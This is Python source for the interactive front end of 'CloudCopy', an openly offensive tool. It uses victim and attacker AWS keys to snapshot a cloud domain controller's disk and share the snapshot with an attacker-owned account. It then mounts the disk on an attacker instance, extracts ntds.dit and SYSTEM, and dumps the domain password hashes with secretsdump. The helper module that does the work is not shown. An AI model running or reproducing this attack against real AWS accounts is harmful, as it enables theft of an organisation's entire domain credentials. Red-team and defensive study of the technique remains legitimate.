import abc
import cmd
import glob
import os
import re
import readline

from CloudCopyUtils import CloudCopyUtils

# These might change, I'll probably forget to update it
REGIONS = ['us-east-2', 'us-east-1', 'us-west-1', 'us-west-2', 'ap-east-1',
           'ap-south-1', 'ap-northeast-2', 'ap-southeast-1', 'ap-southeast-2',
           'ap-northeast-1', 'ca-central-1', 'cn-north-1', 'cn-northwest-1',
           'eu-central-1', 'eu-west-1', 'eu-west-2', 'eu-west-3', 'eu-north-1',
           'sa-east-1', 'us-gov-east-1', 'us-gov-west-1']

# readline is weird on some systems
if 'libedit' in readline.__doc__:
    readline.parse_and_bind("bind ^I rl_complete")
else:
    readline.parse_and_bind("tab: complete")


'''
This class is the base command interpreter that handles the user input. 
Different attacks or modes extend this and add new commands.
'''
class BaseCmdInterpreter(cmd.Cmd):

    def __init__(self):
        self.options = {
            'youraccountid': '',  # the id of the attacker owned AWS account that is used to share the snapshot with
            'localkeypath': ''  # the local system path of a AWS .pem key file for authenticating to the linux EC2
        }
        super(BaseCmdInterpreter, self).__init__()

    def cmdloop(self, intro=None):
        return super(BaseCmdInterpreter, self).cmdloop()

    def do_exit(self, args):
        return True

    def emptyline(self):
        pass

    # helper for tab completing file paths when setting 'localkeypath'
    def _complete_path(self, path):
        if os.path.isdir(path):
            return glob.glob(os.path.join(path, '*'))
        else:
            return glob.glob(path + '*')

    # helper for tab completing file paths when setting 'victimprofile/attackerprofile'. Expects ~/.aws/credentials file
    def _complete_profiles(self):
        from os.path import expanduser
        home = expanduser("~")
        credentials = open(home+"/.aws/credentials").read()
        profiles = re.findall('\[.+\]', credentials)
        return list(map(lambda x:x[1:-1], profiles))

    # lists results from previous 'stealDCHashes' attempt. If the 'secrets*' files have been moved this returns nothing
    def do_list_hashes(self, args):
        """list_hashes
        Display previously gained hashes"""
        secrets = glob.glob("./secrets*")
        if len(secrets) > 0:
            for secret in secrets:
                print(open(secret).read())
        else:
            print("no hashes found yet")

    def do_set(self, line):
        """set [property] [value]
        Set the CloudCopy properties"""
        arguments = [l for l in line.split()]
        if len(arguments) < 2:
            print("Not enough arguments")
        else:
            self.options[arguments[0]] = arguments[1]

    # auto complete helper for setting options
    def complete_set(self, text, line, begidx, endidx):
        options = self.options.keys()

        if 'localkeypath' in line:
            mline = line.split(' ')[-1]
            offs = len(mline) - len(text)
            completions = []
            if line.split()[-2] == 'localkeypath':
                completions = self._complete_path(mline)
            return [s[offs:] for s in completions if s.startswith(mline)]
        elif 'region' in line:
            if text:
                completions = [f
                               for f in REGIONS
                               if f.startswith(text)
                               ]
            else:
                completions = REGIONS
        elif 'Profile' in line:
            if text:
                completions = [f
                               for f in self._complete_profiles()
                               if f.startswith(text)]
            else:
                completions = self._complete_profiles()
        else:
            completions = [f
                           for f in options
                           if f.startswith(text)
                           ]
        return completions

    def do_show_options(self, args):
        """show_options
        Show CloudCopy properties and their currently set values"""
        print(self.options)


'''
Generic CloudCopy class that the two access types extend off of
Both access methods use the same path to steal DC hashes what
changes is how you authenticate to AWS. Subclasses implement the
stealDHashes method to perform the authentication 
'''
class BaseCloudCopy(BaseCmdInterpreter, abc.ABC):

    def __init__(self, parentOptions):
        BaseCmdInterpreter.__init__(self)
        abc.ABC.__init__(self)
        self.cloudCopier = None
        self.options = parentOptions
        self.options['region'] = ''  # AWS region for accessing the victim instance
        self.options['instance_id'] = ''  # instance id of attacker owned EC2 that contains ntds.dit and SYSTEM file

    # abstract method subclasses implement to authenticate to AWS
    @abc.abstractmethod
    def do_stealDCHashes(self, args):
        pass

    # helper for extracting the ntds.dit and SYSTEM file from an attacker controlled instance that already exists
    def stealExistingInstance(self):
        self.cloudCopier.createInstance()
        self.cloudCopier.grabDCHashFiles()

    # helper for performing the CloudCopy attack from scratch
    def stealNewInstance(self):
        self.cloudCopier.listInstances()
        if self.cloudCopier.createSnapshot():
            print("Snapshot created, sharing it with attacker account")
            self.cloudCopier.modifySnapshot()
        self.cloudCopier.createSecurityGroup()
        self.cloudCopier.createInstance()
        self.cloudCopier.grabDCHashFiles()


'''
BaseCloudCopy sub-class that uses .aws/credentials profiles to authenticate to AWS and perform CloudCopy
'''
class ProfileCloudCopy(BaseCloudCopy):

    def __init__(self, parentOptions):
        super(ProfileCloudCopy, self).__init__(parentOptions)
        self.prompt = "(Profile CloudCopy)"
        self.options['attackerProfile'] = ''  # name of .aws/credentials profile that pertains to attacker account
        self.options['victimProfile'] = ''  # name of .aws/credentials profile that pertains to victim account

    # implementation of do_stealDCHashes that uses the .aws/credentials profiles to authenticate to AWS
    def do_stealDCHashes(self, args):
        """stealDCHashes
        Initiate the CloudCopy attack to steal the ntds.dit and SYSTEM file to recreate domains hashes"""

        if '' not in [value for key, value in self.options.items() if key not in ['instance_id']]:
            if self.options['instance_id'] != '':
                self.cloudCopier = CloudCopyUtils({'type': 'profile', 'mode': 'attacker', 'options': self.options})
                self.stealExistingInstance()
            else:
                self.cloudCopier = CloudCopyUtils({'type': 'profile', 'mode': 'victim', 'options': self.options})
                self.stealNewInstance()
        else:
            print("Your forgot to set some properties. Make sure that no properties in 'show_options' is set to '' ")


'''
BaseCloudCopy sub-class that uses user supplied credentials to authenticate to AWS and perform CloudCopy
'''
class ManualCloudCopy(BaseCloudCopy):

    def __init__(self, parentOptions):
        super(ManualCloudCopy, self).__init__(parentOptions)
        self.prompt = "(Manual CloudCopy)"
        self.options['attackerAccessKey'] = ''  # AccessKey to attacker account
        self.options['attackerSecretKey'] = ''  # SecretKey to attacker account
        self.options['victimAccessKey'] = ''  # AccessKey to victim account
        self.options['victimSecretKey'] = ''  # SecretKey to attacker account

    # implementation of do_stealDCHashes that uses the user supplied credentials to authenticate to AWS
    def do_stealDCHashes(self, args):
        """stealDCHashes
        Initiate the CloudCopy attack to steal the ntds.dit and SYSTEM file to recreate domains hashes"""
        if '' not in [value for key, value in self.options.items() if key not in ['instance_id']]:
            if self.options['instance_id'] != '':
                self.cloudCopier = CloudCopyUtils({'type': 'manual', 'mode': 'attacker', 'options': self.options})
                self.stealExistingInstance()
            else:
                self.cloudCopier = CloudCopyUtils({'type': 'manual', 'mode': 'attacker', 'options': self.options})
                self.stealNewInstance()
        else:
            print("Your forgot to set some properties. Make sure that no properties in 'show_options' is set to '' ")


'''
BaseCmdInterpreter sub-class that adds CloudCopy attack commands
'''
class MainMenu(BaseCmdInterpreter):

    def __init__(self):
        super(MainMenu, self).__init__()
        self.usage()
        self.prompt = "(CloudCopy)"

    def usage(self):
            print("""CLOUDCOPY your one stop shop for stealing goodies from Cloud instances!
CLOUDCOPY uses a simple process of VInstance->Snapshot->Volume->AInstance 
to steal the hard drive of a victim instance and mount it to an attacker 
controlled box for pilfering. CLOUDCOPY has two main modes, Profile and Manual.
There are two modes for accessing AWS:
    Profile: Which uses the profiles in .aws/credentials file for authenticating
    Manual:  Which uses supplied Access/Secret keys of the Victim/Attacker for authenticating
For one attack path:
    StealDCHashes: This mode is meant to run against Domain Controllers in the cloud.
                    It copies the drive to a Linux system, extracts the ntds.dit and SYSTEM
                    files and uses Impacket's secretsdump to recreate the Domains hashes.""")

    #helper to reset options when switching between attack types
    def reset_options(self):
        self.options = {'youraccountid': '', 'localkeypath': ''}

    #initiates profile based CloudCopy attack
    def do_profile_cloudcopy(self, args):
        """profile_cloudcopy
        CloudCopy attack using .aws/credential profiles to authenticate"""
        sub_cmd = ProfileCloudCopy(self.options)
        sub_cmd.cmdloop()
        self.reset_options()

    #initiates manual based CloudCopy attack
    def do_manual_cloudcopy(self, args):
        """manual_cloudcopy
        CloudCopy attack using manually set attacker/victim access/secret keys to authenticate"""
        sub_cmd = ManualCloudCopy(self.options)
        sub_cmd.cmdloop()
        self.reset_options()


if __name__ == '__main__':
    cmd = MainMenu()
    cmd.cmdloop()
